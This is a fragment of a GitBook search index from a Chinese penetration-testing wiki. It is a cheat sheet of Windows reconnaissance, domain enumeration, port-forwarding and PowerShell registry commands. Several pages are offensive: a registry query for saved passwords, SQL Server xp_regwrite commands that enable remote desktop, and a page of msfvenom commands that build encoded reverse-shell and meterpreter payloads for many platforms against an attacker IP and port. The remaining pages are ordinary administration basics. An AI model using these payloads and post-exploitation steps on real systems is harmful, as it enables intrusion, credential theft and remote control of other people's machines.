console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/基础网络命令.html":{"url":"常用命令/基础网络命令.html","title":"基础网络命令","keywords":"","body":"基本网络命令 ipconfig/all 查看IP地址 whoami 查询账号所属权限 whoami/all 查看sid值 systeminfo 查询系统以及补丁信息 tasklist /svc 查看进程 taskkill /im 进程名称(cmd) 结束进程 taskkill /pid [进程码] -t(结束该进程) -f(强制结束该进程和子进程) wmic qfe get hotfixid 查看已安装过得补丁 wmic qfe list full /format:htable > hotfixid.html 详细的补丁安装 ping hostname(主机名） 显示该机器名的IP net start 查看当前运行的服务 net user 查看本地组的用户 net session 查看当前会话 net share 查看SMB指向的路径 net use \\\\IP\\ipc$ password /user:username 建立IPC会话 wmic share get name,path 查看SMB指向的路径 wmic nteventlog get path,filename,writeable 查询系统日志文件存储位置 net use \\\\IP\\ipc$ password /user:username 建立IPC会话 netstat -ano 查看开放的端口 netstat -an | find “3389” 找到3389端口 net accounts 查看本地密码策略 nbtstat –A ip netbiso查询 net view 查看机器注释 echo %PROCESSOR_ARCHITECTURE% 查看系统是32还是64位 set 查看系统环境设置变量 net start 查看当前运行的服务 wmic service list brief 查看进程服务 wmic process list brief 查看进程 wmic startup list brief 查看启动程序信息 wmic product list brief 查看安装程序和版本信息 wmic startup list full 识别开机启动的程序 wmic product > pro.txt 查看安装软件以及版本路径等信息，输出到pro.txt if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) 查看是否支持posershell qwinsta 查看登录情况 REG query HKCU /v \"pwd\" /s 查看保存在注册表中的密码 for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i\"ttl\" 批量扫描内网存活主机（192.168.1.内网IP段） 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 17:13:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/路由常用命令.html":{"url":"常用命令/路由常用命令.html","title":"上路由常用命令","keywords":"","body":"路由查询常用命令 tracert IP 路由跟踪 route print 打印路由表 arp -a 列出本网段内所有活跃的IP地址 arp -s （ip + mac） 绑定mac与ip地址 arp -d （ip + mac） 解绑mac与ip地址 netsh firewall show config 查看防火墙策略 netsh firewall show state 查看防火墙策略 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 16:37:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/域操作命令.html":{"url":"常用命令/域操作命令.html","title":"域操作命令","keywords":"","body":"域操作基础命令 net group /domain 获得所有域用户组列表 net group xxxxx /domain 显示域中xxxxx组的成员 net group xxxxx /del /domain 删除域中xxxxx组 net group xxxxx xy /del /domain 删除域内xxxxx 群组中的xy成员 net group xxxxx /add /domain 增加域中的群组 net group \"domain admins\" /domain 获得域管理员列表 net group \"enterprise admins\" /domain 获得企业管理员列表 net localgroup administrators /domain 获取域内置administrators组用（enterprise admins、domain admins） net group \"domain controllers\" /domain 获得域控制器列表 net group \"domain computers\" /domain 获得所有域成员计算机列表 net user /domain 获得所有域用户列表 net user xxxx /domain 获得指定账户xxxx的详细信息 net accounts /domain 获得域密码策略设置，密码长短，错误锁定等信息 net view /domain 查询有几个域, 查询域列表 net view /domain:xxxx 查看 xxxx域中的计算机列表 nltest /domain_trusts 获取域信任信息 net user domain-admin /domain 查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息 net config Workstation 查询机器属于哪个域 net time /domian 查询主域服务器的时间 echo %logonserver% 查看登陆到这台服务器的计算机名 gpupdate/force 更新域策略 tasklist /S ip /U domain\\username /P /V 查看远程计算机进程列 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 16:38:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/Dos快捷命令.html":{"url":"常用命令/Dos快捷命令.html","title":"Dos快捷命令","keywords":"","body":"DOS快捷命令 mspaint 画图工具 calc 计算器 notepad 记事本 taskmgr 任务管理器 osk 打开屏幕键盘 gpedit.msc 组策略 services.msc 本地服务 compmgmt.msc 计算机管理 devmgmt.msc 设备管理器 winver 查看系统版本 magnify 放大镜实用程序 eventvwr 事件查看器 Regedit 打开注册表 resmon 资源监视器 WMIC BIOS get releasedate 查看电脑生产日期 mstsc -f 远程连接 copy 路径\\文件名 路径\\文件名 复制文件 move 路径\\文件名 路径\\文件名 移动文件 del 文件名 删除文件（不能删除文件夹） 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 17:09:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/windows端口转发.html":{"url":"常用命令/windows端口转发.html","title":"Windows端口转发","keywords":"","body":"windows端口转发 netsh interface ipv6 install 首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！） netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22connectaddress=1.1.1.1 connectport=22 //将本机22到1.1.1.1的22 netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=8.8.8.8 connectport=22 netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=百度一下，你就知道 connectport=22 netsh interface portproxy show all 查看转发配置 netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0listenport=22 删除配置 netsh firewall set portopening protocol=tcp port=22 name=Forwardmode=enable scope=all profile=all 添加防火墙规则，允许连接22： 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 21:33:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/sql server常用操作远程桌面命令.html":{"url":"常用命令/sql server常用操作远程桌面命令.html","title":"sql server常用操作远程桌面命令","keywords":"","body":"1.是否开启远程桌面，1表示关闭，0表示开启 EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server' ,'fDenyTSConnections' 2.读取远程桌面端口 EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp','PortNumber' 3.开启远程桌面 EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG_DWORD',0; reg文件开启远程桌面： Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]\"fDenyTSConnections\"=dword:00000000[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp]\"PortNumber\"=dword:00000d3d //// 保存micropoor.reg，并执行regedit /s micropoor.reg 注：如果第一次开启远程桌面，部分需要配置防火墙规则允许远程端口。 netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow 4.关闭远程桌面 EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG_DWORD',1; Micropoor 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 23:17:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/msfvenom常用生成payload命令.html":{"url":"常用命令/msfvenom常用生成payload命令.html","title":"msfvenom常用生成payload命令","keywords":"","body":"windows: msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST= 攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o payload.exe mac: msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho android: //需要签名 msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f apk -o payload.apk powershell: msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST= 攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1 linux: msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f elf -o payload.elf php: msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php cat shell.php | pbcopy && echo ' shell.php && pbpaste >> shell.php aspx: msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= 攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx jsp: msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻 击机端口 -f raw -o payload.jsp war: msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw - o payload.war nodejs: msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.js python: msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 - f raw -o payload.py perl: msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.pl ruby: msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb lua: msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.lua windows shellcode: msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST= 攻击机IP LPORT=攻击机端口 -f c linux shellcode: msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f c mac shellcode: msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c 补充说明 便捷化payload生成： 项目地址：https://github.com/Screetsec/TheFatRat root@John:~/Desktop# git clone https://github.com/Screetsec/TheFatRat.git //设置时需要挂墙 附录： 中文使用说明： Options: -p, --payload 使用指定的payload --payload-options 列出该payload参数 -l, --list [type] 列出所有的payloads -n, --nopsled 为payload指定一个 nopsled 长度 -f, --format 指定payload生成格式 --help-formats 查看所有支持格式 -e, --encoder 使用编码器 -a, --arch 指定payload构架 --platform 指定payload平台 --help-platforms 显示支持的平台 -s, --space 设定payload攻击荷载的最大长度 --encoder-space The maximum size of the encoded payload (defaults to the -s value) -b, --bad-chars 指定bad-chars 如: '\\x00\\xff' -i, --iterations 指定编码次数 -c, --add-code 指定个win32 shellcode 文件 -x, --template 指定一个 executable 文件作为模板 -k, --keep payload自动分离并注入到新的进程 -o, --out 存放生成的payload -v, --var-name 指定自定义变量 --smallest Generate the smallest possible payload -h, --help 显示帮助文件 Micropoor 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 00:33:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/powershell基础命令.html":{"url":"常用命令/powershell基础命令.html","title":"Powershell基础命令","keywords":"","body":"powershell递归寻址注册表 $key = Get-Item HKLM:\\Software\\Microsoft\\PowerShell\\1 $key.Name HKEY_LOCAL_MACHINE\\Software\\Microsoft\\PowerShell\\1 $key | Format-List ps* 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 00:21:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/powershell常用命令.html":{"url":"常用命令/powershell常用命令.html","title":"Powershell常用命令","keywords":"","body":"Powershell常用命令 get-host或$host.version或$PSVersionTable.PSVERSION 查看powershell版本 New-Item test -type Directory 新建目录 New-Item test -type File 新建文件 Remove-Item 文件或目录 删除文件或目录 get-content 1.txt 显示文本内容 set-content 1.txt -value \"helloword\" 设置文件内容 add-content 1.txt -value \"love\" 追加文本内容 Get-ExecutionPolicy 查看powershell执行策略 Set-ExecutionPolicy Unrestricted 设置powershell执行策略 Restricted 为脚本不能运行，是默认设置 Unrestricted 为允许所有的脚本运行 RemoteSigned 为只能运行本地创建的脚本，不能运行从网上下载的脚本，除了有数字签名证书 Allsigned 为只运行有受信任的发布者签名的脚本 get-process 获取所有进程 Set-Alias 例如Set-Alias aaa get-process 给命令起别名 Get-Command 查看当前作用域支持的所有命令 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 00:23:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/powershell注册表操作.html":{"url":"常用命令/powershell注册表操作.html","title":"Powershell注册表操作","keywords":"","body":"注册表操作命令 Get-PSProvider 获取安装的提供程序列表 Dir, Get-ChildItem 列出键的内容 Cd, Set-Location 更改当前（键）目录 HKCU:, HKLM: 预定义的两个重要注册表根目录虚拟驱动器 Get-ItemProperty 读取键的值 Set-ItemProperty 设置键的值 New-ItemProperty 给键创建一个新值 Clear-ItemProperty 删除键的值内容 Remove-ItemProperty 删除键的值 New-Item, md 创建一个新键 Remove-Item, Del 删除一个键 Test-Path 验证键是否存在 Get-PSDrive -PSProvider Registry 查看那些注册表驱动器已经被注册表提供程序使用 New-PSDrive job1 registry \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\" dir job1: 自由地创建任何额外的驱动器 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 00:21:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"常用命令/powershell操作注册表权限.html":{"url":"常用命令/powershell操作注册表权限.html","title":"Powershell操作注册表权限","keywords":"","body":"powershell操作注册表权限 Get-Acl 查看键的当前权限 $acl = Get-Acl HKCU:\\Software\\Testkey $acl.Owner mosser $me = [System.Security.Principal.NTAccount]\"$env:userdomain\\$env:username\" $acl.SetOwner($me) 接管一个注册表键（先有权限访问）的所有权限 del HKCU:\\Software\\Testkey2 md HKCU:\\Software\\Testkey2 $acl = Get-Acl HKCU:\\Software\\Testkey2 $person = [System.Security.Principal.NTAccount]\"Administrators\" $access = [System.Security.AccessControl.RegistryRights]\"FullControl\" $inheritance = [System.Security.AccessControl.InheritanceFlags]` \"ObjectInherit,ContainerInherit\" $propagation = [System.Security.AccessControl.PropagationFlags]\"None\" $type = [System.Security.AccessControl.AccessControlType]\"Allow\" $rule = New-Object System.Security.AccessControl.RegistryAccessRule( ` $person,$access,$inheritance,$propagation,$type) $acl.ResetAccessRule($rule) $person = [System.Security.Principal.NTAccount]\"Everyone\" $access = [System.Security.AccessControl.RegistryRights]\"ReadKey\" $inheritance = [System.Security.AccessControl.InheritanceFlags]` \"ObjectInherit,ContainerInherit\" $propagation = [System.Security.AccessControl.PropagationFlags]\"None\" $type = [System.Security.AccessControl.AccessControlType]\"Allow\" $rule = New-Object System.Security.AccessControl.RegistryAccessRule( ` $person,$access,$inheritance,$propagation,$type) $acl.ResetAccessRule($rule) Set-Acl HKCU:\\Software\\Testkey2 $acl 管理员拥有更改权限普通用户只有读取的新键的权限 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 00:20:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"link.html":{"url":"link.html","title":"友情链接","keywords":"","body":"友情链接 【链接】雨苁|暗网|黑客|极客|渗透测试|专注信息安全 【链接】颓废's Blog 【链接】黑客街导航网站 【链接】hack学习 【链接】干货集中营 【链接】渗透师导航 【链接】清沐Blog 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 20:22:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"about.html":{"url":"about.html","title":"关于我们","keywords":"","body":"123456789 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-14 13:07:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"}}